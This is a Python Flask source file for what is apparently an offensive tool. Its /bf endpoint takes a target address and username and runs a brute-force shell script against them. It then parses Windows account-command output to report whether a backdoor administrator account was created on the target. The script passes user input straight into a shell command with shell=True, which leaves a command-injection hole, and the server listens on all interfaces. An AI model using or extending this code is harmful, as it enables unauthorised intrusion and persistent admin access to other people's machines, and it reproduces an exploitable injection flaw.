import flask
from flask import request, abort
from Endpoint import Endpoint
import subprocess as sp
app = flask.Flask(__name__)
app.config["DEBUG"] = False
BF_FORMAT = './Bruteforcer.sh -a {address} -u {user}'


@app.route('/bf', methods=['POST'])
def bruteforce():
    if not request.json or not 'address' in request.json or not 'username' in request.json:
        abort(400)
    #TODO -> Allow multiple endpoints
    endpoint = Endpoint(request.json['address'],request.json['username']
    )
    process = sp.Popen(BF_FORMAT.format(user = endpoint.username, address=endpoint.address), shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
    process.wait()
    stdout, stderr = process.communicate()
    stdout = stdout.decode('utf-8')
    print(stderr)
    stderr = stderr.decode('utf-8')
    #TODO -> Return as JSON
    msg = ""
    if "The command completed successfully.\r\n\r\nThe command completed successfully.\r\n\r\n" in stdout:
        return "\nBackdoor created successfully on "+ endpoint.address
    elif "The account already exists." in stdout:
        msg += "\nDidnt create account as it already exsists on " + endpoint.address
        if "The specified account name is already a member of the group." in stdout:
            msg += "\nThe user already is an administrator on " + endpoint.address
        else:
            msg += "\nBackdoor created successfully on "+ endpoint.address
    else:
        abort(400, "unknown error:{}".format(stderr))
    return msg

@app.route('/')
def index():
	return "echo"
app.run(host="0.0.0.0", port=5000)
